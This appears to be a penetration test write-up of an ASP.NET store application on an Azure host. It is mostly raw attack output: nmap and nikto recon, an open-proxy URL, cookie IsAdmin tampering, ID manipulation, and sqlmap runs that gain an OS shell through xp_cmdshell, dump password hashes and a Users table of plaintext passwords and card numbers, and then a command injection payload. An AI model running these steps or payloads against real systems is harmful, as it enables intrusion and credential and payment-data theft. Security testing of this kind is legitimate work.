# Gss WebAp PT

## Information Gathering
### Basic Recon
```java
msf6 exploit(windows/smb/psexec) > db_nmap -sV 40.76.51.149 -Pn
[*] Nmap: Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-20 01:42 UTC
[*] Nmap: Nmap scan report for 40.76.51.149
[*] Nmap: Host is up (0.016s latency).
[*] Nmap: Not shown: 995 filtered tcp ports (no-response)
[*] Nmap: PORT     STATE SERVICE            VERSION
[*] Nmap: 21/tcp   open  ftp                Microsoft ftpd
[*] Nmap: 80/tcp   open  http               Microsoft IIS httpd 7.5
[*] Nmap: 445/tcp  open  microsoft-ds?
[*] Nmap: 1433/tcp open  ms-sql-s           Microsoft SQL Server 2008 R2 10.50.6592
[*] Nmap: 3389/tcp open  ssl/ms-wbt-server?
[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 87.18 seconds
```

### Nmap Automator
```bash
┌──(root💀kali)-[~/sec/nmapAutomator/digiserver2.eastus.cloudapp.azure.com]
└─# cat nmapAutomator_digiserver2.eastus.cloudapp.azure.com_All.txt

Running all scans on digiserver2.eastus.cloudapp.azure.com with IP 52.152.142.125


No ping detected.. Will not use ping scans!


Host is likely running Unknown OS!


---------------------Starting Port Scan-----------------------



PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s
3389/tcp open  ms-wbt-server



---------------------Starting Script Scan-----------------------



PORT     STATE SERVICE            VERSION
21/tcp   open  ftp                Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV IP 10.5.0.6 is not the same as 52.152.142.125
80/tcp   open  http               Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS7
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s           Microsoft SQL Server 2008 R2 10.50.6592.00; SP3+
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2022-08-18T05:15:19
|_Not valid after:  2052-08-18T05:15:19
|_ssl-date: 2022-08-18T07:53:29+00:00; 0s from scanner time.
| ms-sql-ntlm-info:
|   Target_Name: DIGISERVER2
|   NetBIOS_Domain_Name: DIGISERVER2
|   NetBIOS_Computer_Name: DIGISERVER2
|   DNS_Domain_Name: digiserver2
|   DNS_Computer_Name: digiserver2
|_  Product_Version: 6.1.7601
3389/tcp open  ssl/ms-wbt-server?
|_ssl-date: 2022-08-18T07:53:29+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=digiserver2
| Not valid before: 2022-06-26T01:07:03
|_Not valid after:  2022-12-26T01:07:03
| rdp-ntlm-info:
|   Target_Name: DIGISERVER2
|   NetBIOS_Domain_Name: DIGISERVER2
|   NetBIOS_Computer_Name: DIGISERVER2
|   DNS_Domain_Name: digiserver2
|   DNS_Computer_Name: digiserver2
|   Product_Version: 6.1.7601
|_  System_Time: 2022-08-18T07:52:49+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   2.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2022-08-18T07:52:53
|_  start_date: 2022-08-18T05:15:18
| ms-sql-info:
|   52.152.142.125:1433:
|     Version:
|       name: Microsoft SQL Server 2008 R2 SP3+
|       number: 10.50.6592.00
|       Product: Microsoft SQL Server 2008 R2
|       Service pack level: SP3
|       Post-SP patches applied: true
|_    TCP port: 1433



OS Detection modified to: Windows




---------------------Starting Full Scan------------------------



PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s
3389/tcp open  ms-wbt-server



No new ports




----------------------Starting UDP Scan------------------------





No UDP ports are open




---------------------Starting Vulns Scan-----------------------

Running CVE scan on all ports



PORT     STATE SERVICE            VERSION
21/tcp   open  ftp                Microsoft ftpd
80/tcp   open  http               Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s           Microsoft SQL Server 2008 R2 10.50.6592
3389/tcp open  ssl/ms-wbt-server?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows



Running Vuln scan on all ports
This may take a while, depending on the number of detected services..



PORT     STATE SERVICE            VERSION
21/tcp   open  ftp                Microsoft ftpd
80/tcp   open  http               Microsoft IIS httpd 7.5
| http-enum:
|   /admin/: Possible admin folder
|   /Admin/: Possible admin folder
|_  /store/: Potentially interesting folder
|_http-server-header: Microsoft-IIS/7.5
| vulners:
|   cpe:/a:microsoft:internet_information_server:7.5:
|       VERACODE:21774  5.0     https://vulners.com/veracode/VERACODE:21774
|       VERACODE:20937  4.3     https://vulners.com/veracode/VERACODE:20937
|       VERACODE:34570  4.0     https://vulners.com/veracode/VERACODE:34570
|       VERACODE:31557  4.0     https://vulners.com/veracode/VERACODE:31557
|_      VERACODE:27647  3.5     https://vulners.com/veracode/VERACODE:27647
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s           Microsoft SQL Server 2008 R2 10.50.6592
|_tls-ticketbleed: ERROR: Script execution failed (use -d to debug)
| ssl-dh-params:
|   VULNERABLE:
|   Diffie-Hellman Key Exchange Insufficient Group Strength
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
|       of insufficient strength, especially those using one of a few commonly
|       shared groups, may be susceptible to passive eavesdropping attacks.
|     Check results:
|       WEAK DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_WITH_AES_128_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: RFC2409/Oakley Group 2
|             Modulus Length: 1024
|             Generator Length: 1024
|             Public Key Length: 1024
|     References:
|_      https://weakdh.org
| ssl-poodle:
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  BID:70574  CVE:CVE-2014-3566
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_3DES_EDE_CBC_SHA
|     References:
|       https://www.openssl.org/~bodo/ssl-poodle.pdf
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|       https://www.securityfocus.com/bid/70574
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
3389/tcp open  ssl/ms-wbt-server?
| ssl-dh-params:
|   VULNERABLE:
|   Diffie-Hellman Key Exchange Insufficient Group Strength
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
|       of insufficient strength, especially those using one of a few commonly
|       shared groups, may be susceptible to passive eavesdropping attacks.
|     Check results:
|       WEAK DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_WITH_AES_128_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: RFC2409/Oakley Group 2
|             Modulus Length: 1024
|             Generator Length: 1024
|             Public Key Length: 1024
|     References:
|_      https://weakdh.org
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR




---------------------Recon Recommendations---------------------


Web Servers Recon:

nikto -host "http://digiserver2.eastus.cloudapp.azure.com:80" | tee "recon/nikto_digiserver2.eastus.cloudapp.azure.com_80.txt"
ffuf -ic -w /usr/share/wordlists/dirb/common.txt -e '' -u "http://digiserver2.eastus.cloudapp.azure.com:80/FUZZ" | tee "recon/ffuf_digiserver2.eastus.cloudapp.azure.com_80.txt"


ldap Recon:

ldapsearch -x -h "digiserver2.eastus.cloudapp.azure.com" -s base | tee "recon/ldapsearch_digiserver2.eastus.cloudapp.azure.com.txt"
ldapsearch -x -h "digiserver2.eastus.cloudapp.azure.com" -b "$(grep rootDomainNamingContext "recon/ldapsearch_digiserver2.eastus.cloudapp.azure.com.txt" | cut -d ' ' -f2)" | tee "recon/ldapsearch_DC_digiserver2.eastus.cloudapp.azure.com.txt"
nmap -Pn -p 389 --script ldap-search --script-args 'ldap.username="$(grep rootDomainNamingContext "recon/ldapsearch_digiserver2.eastus.cloudapp.azure.com.txt" | cut -d \ \ -f2)"' "digiserver2.eastus.cloudapp.azure.com" -oN "recon/nmap_ldap_digiserver2.eastus.cloudapp.azure.com.txt"


SMB Recon:

smbmap -H "digiserver2.eastus.cloudapp.azure.com" | tee "recon/smbmap_digiserver2.eastus.cloudapp.azure.com.txt"
smbclient -L "//digiserver2.eastus.cloudapp.azure.com/" -U "guest"% | tee "recon/smbclient_digiserver2.eastus.cloudapp.azure.com.txt"
nmap -Pn -p445 --script vuln -oN "recon/SMB_vulns_digiserver2.eastus.cloudapp.azure.com.txt" "digiserver2.eastus.cloudapp.azure.com"





Which commands would you like to run?
All (Default), ffuf, ldapsearch, nikto, nmap, smbclient, smbmap, Skip <!>

Running Default in (1)s:


---------------------Running Recon Commands--------------------


Starting nikto scan

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          52.152.142.125
+ Target Hostname:    digiserver2.eastus.cloudapp.azure.com
+ Target Port:        80
+ Start Time:         2022-08-18 08:07:11 (GMT0)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/7.5
+ Retrieved x-powered-by header: ASP.NET
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-aspnet-version header: 4.0.30319
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ RFC-1918 IP address found in the 'location' header. The IP is "10.5.0.6".
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /aspnet_client over HTTP/1.0. The value is "10.5.0.6".
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST
+ OSVDB-3092: /admin/: This might be interesting...
+ Cookie VisitStart created without the httponly flag
+ OSVDB-3092: /store/: This might be interesting...
+ OSVDB-3092: /Admin/: This might be interesting...
+ /: Appears to be a default IIS 7 install.
+ 8019 requests: 0 error(s) and 14 item(s) reported on remote host
+ End Time:           2022-08-18 08:09:32 (GMT0) (141 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

Finished nikto scan

=========================

Starting ffuf scan

                        [Status: 200, Size: 689, Words: 25, Lines: 32, Duration: 15ms]
admin                   [Status: 301, Size: 177, Words: 9, Lines: 2, Duration: 16ms]
Admin                   [Status: 301, Size: 177, Words: 9, Lines: 2, Duration: 18ms]
ADMIN                   [Status: 301, Size: 177, Words: 9, Lines: 2, Duration: 19ms]
aspnet_client           [Status: 301, Size: 185, Words: 9, Lines: 2, Duration: 14ms]
store                   [Status: 200, Size: 7045, Words: 1194, Lines: 184, Duration: 27ms]

Finished ffuf scan

=========================

Starting ldapsearch scan


Finished ldapsearch scan

=========================

Starting ldapsearch scan


Finished ldapsearch scan

=========================

Starting nmap scan

Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-18 08:09 UTC
NSE: args = ldap.username="$(grep rootDomainNamingContext "recon/ldapsearch_digiserver2.eastus.cloudapp.azure.com.txt" | cut -d \ \ -f2)"

Finished nmap scan

=========================

Starting smbmap scan

[+] IP: digiserver2.eastus.cloudapp.azure.com:445       Name: unknown

Finished smbmap scan

=========================

Starting smbclient scan

session setup failed: NT_STATUS_ACCOUNT_DISABLED

Finished smbclient scan

=========================

Starting nmap scan

Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-18 08:09 UTC
Nmap scan report for digiserver2.eastus.cloudapp.azure.com (52.152.142.125)
Host is up (0.016s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR

Nmap done: 1 IP address (1 host up) scanned in 23.75 seconds

Finished nmap scan

=========================



---------------------Finished all scans------------------------


Completed in 18 minute(s) and 41 second(s)
```


## External service interaction
### Proxy
把網站當Proxy使用，可被用於[DDOS](https://github.com/649/Memcrashed-DDoS-Exploit)
```http://digiserver2.eastus.cloudapp.azure.com/store/Product/Detail?ProductID=1&url=<TARGET>```


## A01:2021 – 權限控制失效
### Cookie
IsAdmin改成true，可成為Admin

`'VisitStart=2022/8/18 上午 07:16:10; authcookie=073C531F8AFCC9315099A2B6A63650EE3ACEDFBEED753A74D2A6EF545933D52E5E14ACA34F0614ADFF9B1865E900079BB074BEB142BBF925F792D3FC26FBF5BC79B8CFF5D876C734B98E7F43CB07C75C83BA5B5A71E3F40214085D73045884F93C8827871D31F68525E171B23D496242E9459E9AF422039C2E38CEA937E840C5; userInfo=%7b%22Email%22%3a%22jim_lee%40gss.com.tw%22%2c%22IsAdmin%22%3afalse%7d; Password=MTIz; Email=jim_lee@gss.com.tw'`

`'VisitStart=2022/8/18上午06:00:41;authcookie=1E71749761580EB92E92A28FCD6ECA4601304280B7A43977CE6D1CEA813373C3E3DC6BDC39B2342657EC696B2B334DA2C393DE3866970FEAB776682305646337A57F77EDF71E94D11AB86BF905C3B3D9EF66CA0480B03CBCE694BC19F0DD0A24D48849C711F2F510F155D2437A32FA4EEB3D99F52DC250B691E3D8EAE23B7D3F;userInfo={"Email":"jim_lee@gss.com.tw","IsAdmin":false};Password=MTIz;Email=jim_lee@gss.com.tw'`

### URL
編輯使用者資訊頁面，可隨意更改URL中的ID
```
http://digiserver2.eastus.cloudapp.azure.com/store/Account/Edit?userId=<14>
```

## A03:2021-注入式攻擊
### Sql Injection
#### OS Shell
```bash!
┌──(root💀kali)-[~]
└─# sqlmap -u "http://digiserver2.eastus.cloudapp.azure.com/store/Account/Login" --method POST --data "Email=admin%40gss.com.tw&Password=123&RememberMe=false" -p "Email,Password" --dbms="MSSQL" --technique USE --batch --banner --os-shell
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.6.7#stable}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:42:27 /2022-08-21/

[09:42:27] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('ASP.NET_SessionId=bxrkv23llmu...d33ju4msnx;VisitStart=2022/8/21 ä...� 09:42:26'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: Password (POST)
    Type: error-based
    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)
    Payload: Email=admin@gss.com.tw&Password=123' AND 4247 IN (SELECT (CHAR(113)+CHAR(112)+CHAR(118)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (4247=4247) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(120)+CHAR(106)+CHAR(118)+CHAR(113)))-- knGZ&RememberMe=false

    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: Email=admin@gss.com.tw&Password=123';WAITFOR DELAY '0:0:5'--&RememberMe=false
---
[09:42:28] [INFO] testing Microsoft SQL Server
[09:42:28] [INFO] confirming Microsoft SQL Server
[09:42:29] [INFO] the back-end DBMS is Microsoft SQL Server
[09:42:29] [INFO] fetching banner
[09:42:29] [INFO] resumed: 'Microsoft SQL Server 2008 R2 (SP3-GDR) (KB4532096) - 10.50.6592.0 (X64) \n\tNov 27 2019 02:04:59 \n\tCopyright (c) Microsoft Corporation\n\tStandard Edition (64-bit) on Window...
web server operating system: Windows 7 or 2008 R2
web application technology: ASP.NET, Microsoft IIS 7.5
back-end DBMS operating system: Windows 7 or 2008 R2 Service Pack 1
back-end DBMS: Microsoft SQL Server 2008
banner:
---
Microsoft SQL Server 2008 R2 (SP3-GDR) (KB4532096) - 10.50.6592.0 (X64)
        Nov 27 2019 02:04:59
        Copyright (c) Microsoft Corporation
        Standard Edition (64-bit) on Windows NT 6.1 <X64> (Build 7601: Service Pack 1) (Hypervisor)
---
[09:42:29] [INFO] retrieved: 'C:\\Program Files\\Microsoft SQL Server\\MSSQL10_50.MSSQLSERVER\\MSSQL\\Log\\ERRORLOG'
[09:42:29] [INFO] testing if current user is DBA
[09:42:29] [INFO] checking if xp_cmdshell extended procedure is available, please wait..
[09:42:39] [WARNING] reflective value(s) found and filtering out
[09:42:39] [WARNING] time-based standard deviation method used on a model with less than 30 response times
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[09:42:39] [INFO] xp_cmdshell extended procedure is available
[09:42:39] [INFO] testing if xp_cmdshell extended procedure is usable
[09:42:40] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[09:42:41] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
[09:43:09] [INFO] adjusting time delay to 1 second due to good response times
[09:43:15] [INFO] xp_cmdshell extended procedure is usable
[09:43:15] [INFO] going to use extended procedure 'xp_cmdshell' for operating system command execution
[09:43:15] [INFO] calling Windows OS shell. To quit type 'x' or 'q' and press ENTER
---
os-shell> whoami
do you want to retrieve the command standard output? [Y/n/a] Y
[09:47:53] [INFO] retrieved: 2
[09:47:55] [INFO] retrieved: nt authority\network service
[09:49:48] [INFO] retrieved:
command standard output: 'nt authority\network service'
```

#### Passwords
```bash!
┌──(root💀kali)-[~]
└─# sqlmap -u "http://digiserver2.eastus.cloudapp.azure.com/store/Account/Login" --method POST --data "Email=admin%40gss.com.tw&Password=123&RememberMe=false" -p "Email,Password" --dbms="MSSQL" --technique USE --batch --password
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.6.7#stable}
|_ -| . [']     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:56:35 /2022-08-21/

[09:56:35] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('ASP.NET_SessionId=eonlnh1ovt2...svgp1rhuis;VisitStart=2022/8/21 ä...� 09:56:34'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: Password (POST)
    Type: error-based
    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)
    Payload: Email=admin@gss.com.tw&Password=123' AND 4247 IN (SELECT (CHAR(113)+CHAR(112)+CHAR(118)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (4247=4247) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(120)+CHAR(106)+CHAR(118)+CHAR(113)))-- knGZ&RememberMe=false

    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: Email=admin@gss.com.tw&Password=123';WAITFOR DELAY '0:0:5'--&RememberMe=false
---
[09:56:36] [INFO] testing Microsoft SQL Server
[09:56:36] [INFO] confirming Microsoft SQL Server
[09:56:37] [INFO] the back-end DBMS is Microsoft SQL Server
[09:56:37] [INFO] fetching banner
[09:56:37] [INFO] resumed: 'Microsoft SQL Server 2008 R2 (SP3-GDR) (KB4532096) - 10.50.6592.0 (X64) \n\tNov 27 2019 02:04:59 \n\tCopyright (c) Microsoft Corporation\n\tStandard Edition (64-bit) on Window...
web server operating system: Windows 7 or 2008 R2
web application technology: ASP.NET, Microsoft IIS 7.5
back-end DBMS operating system: Windows 7 or 2008 R2 Service Pack 1
back-end DBMS: Microsoft SQL Server 2008
banner:
---
Microsoft SQL Server 2008 R2 (SP3-GDR) (KB4532096) - 10.50.6592.0 (X64)
        Nov 27 2019 02:04:59
        Copyright (c) Microsoft Corporation
        Standard Edition (64-bit) on Windows NT 6.1 <X64> (Build 7601: Service Pack 1) (Hypervisor)
---
[09:56:37] [INFO] fetching database users password hashes
[09:56:38] [INFO] retrieved: '##MS_PolicyEventProcessingLogin##'
[09:56:38] [INFO] retrieved: '0x010015f08012ec58ab631b9abc2c70033ac143253a92c912fd51'
[09:56:38] [INFO] retrieved: '##MS_PolicyTsqlExecutionLogin##'
[09:56:38] [INFO] retrieved: '0x01001b9662cf7dc02cff283914d8bdd9c0acdccd5a2381a7f785'
[09:56:38] [INFO] retrieved: 'digiserver2'
[09:56:39] [INFO] retrieved: '0x0100e39f2df9dd121c21c1fb653d33f4f383a27ecda6872198b5'
[09:56:39] [INFO] retrieved: 'sa'
[09:56:39] [INFO] retrieved: '0x0100b3827d3dc443dbe09c400e8d1dd36277d6da32073ebc52b2'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] Y
[09:56:39] [INFO] using hash method 'mssql_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[09:56:39] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[09:56:39] [INFO] starting dictionary-based cracking (mssql_passwd)
[09:56:39] [WARNING] multiprocessing hash cracking is currently not supported on this platform
[10:01:16] [WARNING] no clear password(s) found
database management system users password hashes:
[*] ##MS_PolicyEventProcessingLogin## [1]:
    password hash: 0x010015f08012ec58ab631b9abc2c70033ac143253a92c912fd51
        header: 0x0100
        salt: 15f08012
        mixedcase: ec58ab631b9abc2c70033ac143253a92c912fd51

[*] ##MS_PolicyTsqlExecutionLogin## [1]:
    password hash: 0x01001b9662cf7dc02cff283914d8bdd9c0acdccd5a2381a7f785
        header: 0x0100
        salt: 1b9662cf
        mixedcase: 7dc02cff283914d8bdd9c0acdccd5a2381a7f785

[*] digiserver2 [1]:
    password hash: 0x0100e39f2df9dd121c21c1fb653d33f4f383a27ecda6872198b5
        header: 0x0100
        salt: e39f2df9
        mixedcase: dd121c21c1fb653d33f4f383a27ecda6872198b5

[*] sa [1]:
    password hash: 0x0100b3827d3dc443dbe09c400e8d1dd36277d6da32073ebc52b2
        header: 0x0100
        salt: b3827d3d
        mixedcase: c443dbe09c400e8d1dd36277d6da32073ebc52b2


[10:01:16] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 12 times
[10:01:16] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/digiserver2.eastus.cloudapp.azure.com'

[*] ending @ 10:01:16 /2022-08-21/

```

#### Table Dump
```bash!
┌──(root💀kali)-[~]
└─# sqlmap -u "http://digiserver2.eastus.cloudapp.azure.com/store/Account/Login" --method POST --data "Email=admin%40gss.com.tw&Password=123&RememberMe=false" -p "Email,Password" --dbms="MSSQL" --technique USE --batch -D StoreApp -T Users --dump
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.6.7#stable}
|_ -| . [,]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:04:59 /2022-08-21/

[10:04:59] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('ASP.NET_SessionId=i53yviwi3h1...ohxmaewsa2;VisitStart=2022/8/21 ä...� 10:04:58'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: Password (POST)
    Type: error-based
    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)
    Payload: Email=admin@gss.com.tw&Password=123' AND 4247 IN (SELECT (CHAR(113)+CHAR(112)+CHAR(118)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (4247=4247) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(120)+CHAR(106)+CHAR(118)+CHAR(113)))-- knGZ&RememberMe=false

    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: Email=admin@gss.com.tw&Password=123';WAITFOR DELAY '0:0:5'--&RememberMe=false
---
[10:04:59] [INFO] testing Microsoft SQL Server
[10:04:59] [INFO] confirming Microsoft SQL Server
[10:05:00] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 7 or 2008 R2
web application technology: Microsoft IIS 7.5, ASP.NET
back-end DBMS: Microsoft SQL Server 2008
[10:05:00] [INFO] fetching columns for table 'Users' in database 'StoreApp'
[10:05:00] [INFO] resumed: 'CreditCard'
[10:05:01] [INFO] resumed: 'Email'
[10:05:01] [INFO] resumed: 'FirstName'
[10:05:02] [INFO] resumed: 'IsAdmin'
[10:05:02] [INFO] resumed: 'LastName'
[10:05:02] [INFO] resumed: 'Password'
[10:05:03] [INFO] resumed: 'PasswordHash'
[10:05:03] [INFO] resumed: 'PasswordSalt'
[10:05:03] [INFO] resumed: 'Token'
[10:05:03] [INFO] resumed: 'TokenCreTime'
[10:05:03] [INFO] resumed: 'UserID'

Database: StoreApp
Table: Users
[16 entries]
+--------+--------------------+---------+---------+----------+--------------+-----------+------------------+-------------------------------------------------------------------------+--------------+--------------+
| UserID | Email              | Token   | IsAdmin | LastName | Password     | FirstName | CreditCard       | PasswordHash                                                            | PasswordSalt | TokenCreTime |
+--------+--------------------+---------+---------+----------+--------------+-----------+------------------+-------------------------------------------------------------------------+--------------+--------------+
| 1      | admin@gss.com.tw   | <blank> | 1       | Ho       | 0000         | Admin     | 376074651616659  | 9af15b336e6a9619928537df30b2e6a2376569fcf9d7e773eccede65606529a0 (0000) | AW7+HIlTIxw= | <blank>      |
| 2      | rm@gss.com.tw      | <blank> | 0       | ko       | 1111         | Rainmaker | 6011276771240140 | 0ffe1abd1a08215353c233d6e009613e95eec4253832a761af28ff37ac5a150c (1111) | dWkBjRCn97M= | <blank>      |
| 3      | marty@gss.com.tw   | <blank> | 0       | Chen     | 0003         | Marty     | 375873212311580  | <blank>                                                                 | <blank>      | <blank>      |
| 4      | tony@gss.com.tw    | <blank> | 0       | Ho       | 0004         | Tony      | 5220827962625702 | <blank>                                                                 | <blank>      | <blank>      |
| 5      | cindy@gss.com.tw   | <blank> | 0       | Lin      | 0005         | Cindy     | 4929544383846646 | <blank>                                                                 | <blank>      | <blank>      |
| 6      | eric@gss.com.tw    | <blank> | 0       | Lin      | P@ssw0rd     | Eric      | 4716782913586418 | <blank>                                                                 | <blank>      | <blank>      |
| 7      | jenny@gss.com.tw   | <blank> | 0       | Chang    | 0007         | Jenny     | 5513935910699772 | <blank>                                                                 | <blank>      | <blank>      |
| 8      | rita@gss.com.tw    | <blank> | 0       | Chen     | Pa55w.rd1234 | Rita      | 5129326669683587 | <blank>                                                                 | <blank>      | <blank>      |
| 9      | jack@gss.com.tw    | <blank> | 0       | Kao      | louise       | Jack      | 4916213583352798 | <blank>                                                                 | <blank>      | <blank>      |
| 10     | jackly@gss.com.tw  | <blank> | 0       | Lai      | 0010         | Jackly    | 5448797755400561 | <blank>                                                                 | <blank>      | <blank>      |
| 11     | kenny@gss.com.tw   | <blank> | 0       | Hsu      | 0011         | Kenny     | 4556372572220641 | <blank>                                                                 | <blank>      | <blank>      |
| 12     | scar@gss.com.tw    | <blank> | 0       | Su       | 0012         | Scar      | 4916717674249887 | <blank>                                                                 | <blank>      | <blank>      |
| 13     | linda@gss.com.tw   | <blank> | 0       | Su       | 0013         | Linda     | 5259145533456851 | <blank>                                                                 | <blank>      | <blank>      |
| 14     | jim_lee@gss.com.tw | <blank> | <blank> | Lee      | 123          | Jim       | 1                | a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3 (123)  | 0M31/9uW15o= | <blank>      |
| 15     | b@example.com      | <blank> | <blank> | cd       | 111          | b         | <blank>          | f6e0a1e2ac41945a9aa7ff8a8aaa0cebc12a3bcc981a929ad5cf810a090e11ae (111)  | TKFKk6ySQyo= | <blank>      |
| 16     | a@gss.com.tw       | <blank> | <blank> | qq       | 0000         | q         | <blank>          | 9af15b336e6a9619928537df30b2e6a2376569fcf9d7e773eccede65606529a0 (0000) | xrim/wcMyqM= | <blank>      |
+--------+--------------------+---------+---------+----------+--------------+-----------+------------------+-------------------------------------------------------------------------+--------------+--------------+

[11:15:44] [INFO] table 'StoreApp.dbo.Users' dumped to CSV file '/root/.local/share/sqlmap/output/digiserver2.eastus.cloudapp.azure.com/dump/StoreApp/Users.csv'
[11:15:44] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 308 times
[11:15:44] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/digiserver2.eastus.cloudapp.azure.com'

```

### Command Injection:
Entry Point(無須Admin): 
http://digiserver2.eastus.cloudapp.azure.com/store/Admin/Backup

取得Dir:
![](https://i.imgur.com/XOuQl0v.png)
* 那個`DLEMe.txt`很欠刪，所以就刪了

Root Dir:
`test && dir ..`

User Enum:
```cmd!
